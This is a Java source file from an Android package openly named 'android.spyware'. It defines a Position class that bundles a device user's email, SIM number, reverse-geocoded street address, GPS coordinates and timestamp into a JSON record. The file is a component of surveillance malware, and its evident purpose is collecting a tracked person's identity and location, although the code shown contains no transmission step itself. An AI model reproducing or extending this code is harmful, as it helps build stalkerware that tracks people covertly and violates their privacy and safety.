package android.spyware;

import android.content.Context;
import android.location.Address;
import android.location.Geocoder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This class contains a Position declaration along with some related helper methods.
 */
public class Position {
    private String simNo;
    private String email;
    private String address;
    private double latitude;
    private double longitude;
    private double altitude;
    private float accuracy;
    private String provider;
    private Date date;

    public Position(String email, String simNo, String address, double longitude,
                    double latitude, double altitude, float accuracy, String provider, Date date) {
        this.email = email;
        this.simNo = simNo;
        this.address = address;
        this.longitude = longitude;
        this.latitude = latitude;
        this.altitude = altitude;
        this.accuracy = accuracy;
        this.provider = provider.toUpperCase();
        this.date = date;
    }

    public static String getAddress(Context context, double latitude, double longitude) {
        Geocoder geocoder = new Geocoder(context, Locale.getDefault());
        String result = null;

        try {
            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);

            if (addresses != null && addresses.size() > 0) {
                Address address = addresses.get(0);
                result = address.getAddressLine(0) + "\n";
                result += address.getPostalCode() + "\n";
                result += address.getLocality() + "\n";
                result += address.getCountryName();
            }
        } catch (IOException e) {
            if (DEV_MODE)
                Log.wtf(TAG, "::ERR  Impossible to connect to geocoder.");
        }

        return result;
    }

    public JSONObject toJSON() {
        JSONObject jLocation = new JSONObject();

        try {
            jLocation.put("email", email);
            jLocation.put("simNo", simNo);
            jLocation.put("address", address);
            jLocation.put("longitude", longitude);
            jLocation.put("latitude", latitude);
            jLocation.put("altitude", altitude);
            jLocation.put("accuracy", accuracy);
            jLocation.put("provider", provider);

            // Formatting the date
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            jLocation.put("date", format.format(date));
        } catch (JSONException e) {
            if (DEV_MODE)
                Log.wtf(TAG, "::ERR  " + Log.getStackTraceString(e));
            return null;
        }

        return jLocation;
    }
}
